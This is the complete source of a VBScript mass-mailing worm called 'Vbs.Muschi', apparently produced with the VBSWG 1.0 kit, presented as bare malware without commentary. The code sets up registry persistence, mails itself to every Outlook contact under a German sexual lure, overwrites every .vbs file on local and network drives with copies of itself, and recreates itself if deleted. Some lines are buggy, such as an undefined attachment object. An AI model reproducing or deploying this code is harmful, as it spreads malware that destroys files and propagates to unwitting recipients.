'Vbs.Muschi Created By Ulrike
On Error Resume Next
Set escrdmzmspy= Createobject("scripting.filesystemobject")
if not(escrdmzmspy.fileexists "c:") then
escrdmzmspy.createfolder "c:"
escrdmzmspy.copyfile wscript.scriptfullname,"c:\System.vbs"
Set qbtybzfovza = CreateObject("WScript.Shell")
qbtybzfovza.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Winstart","wscript.exe c:\System.vbs %"
if qbtybzfovza.regread ("HKCU\software\Muschi\mailed") <> "1" then
eqocdtxgkfv()
end if
stsunqucqpx()
msgbox "Hast du einen Ständer oder freust du dich auf ein Fick mit mir?",32
Set supcqgfwqav= escrdmzmspy.opentextfile(wscript.scriptfullname, 1)
ryduuoeswdr= supcqgfwqav.readall
supcqgfwqav.Close
Do
If Not (escrdmzmspy.fileexists(wscript.scriptfullname)) Then
Set bqclrlkhqpa= escrdmzmspy.createtextfile(wscript.scriptfullname, True)
bqclrlkhqpa.writeryduuoeswdr
bqclrlkhqpa.Close
End If
Loop
Function eqocdtxgkfv()
On Error Resume Next
Set sxayennyydp = CreateObject("Outlook.Application")
If sxayennyydp= "Outlook"Then
Set gucswfjeurs=sxayennyydp.GetNameSpace("MAPI")
For Each rtmimbohprs In gucswfjeurs.AddressLists
If rtmimbohprs.AddressEntries.Count <> 0 Then
cttngtflsjr = rtmimbohprs.AddressEntries.Count
For obpfxvpzuqx= 1 To cttngtflsjr
Set kmztspyxitf = sxayennyydp.CreateItem(0)
Set igmovghlqoc = rtmimbohprs.AddressEntries(obpfxvpzuqx)
kmztspyxitf.To = igmovghlqoc.Address
kmztspyxitf.Subject = "Hallo!"
kmztspyxitf.Body = "Hallo!" & vbcrlf & "Ich möchte gerne mit dir in Kontakt treten..." & vbcrlf & ";-)" & vbcrlf & "Deine Ulli"
kuenlfvaazc.Add "c:\System.vbs"
kmztspyxitf.DeleteAfterSubmit = True
If kmztspyxitf.To <> "" Then
kmztspyxitf.Send
qbtybzfovza.regwrite "HKCU\software\Muschi\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function stsunqucqpx()
On Error Resume Next
Set urujqpxzbxj = escrdmzmspy.Drives
For Each rnfwxhwyfku In urujqpxzbxj
If rnfwxhwyfku.Drivetype = Remote Then
bvocnmaratv= rnfwxhwyfku & "\"
Call ivaxhfqboki(bvocnmaratv)
ElseIf rnfwxhwyfku.IsReady Then
bvocnmaratv= rnfwxhwyfku&"\"
Call ivaxhfqboki(bvocnmaratv)
End If
Next
End Function
Function ivaxhfqboki(owdoinzwlmc)
Set mptndiihkvz= escrdmzmspy.GetFolder(owdoinzwlmc)
Set csyygijfrzv= mptndiihkvz.Files
For Each nefqegnldjw In csyygijfrzv
if escrdmzmspy.GetExtensionName(nefqegnldjw.path) = "vbs" then
escrdmzmspy.copyfile wscript.scriptfullname , nefqegnldjw.path , true
end if
Next
Set nefqegnldjw= mptndiihkvz.SubFolders
For Each wkouisiudqd In nefqegnldjw
Call ivaxhfqboki(wkouisiudqd.path)
Next
End Function
'Vbswg 1.0. [K]Alamar.
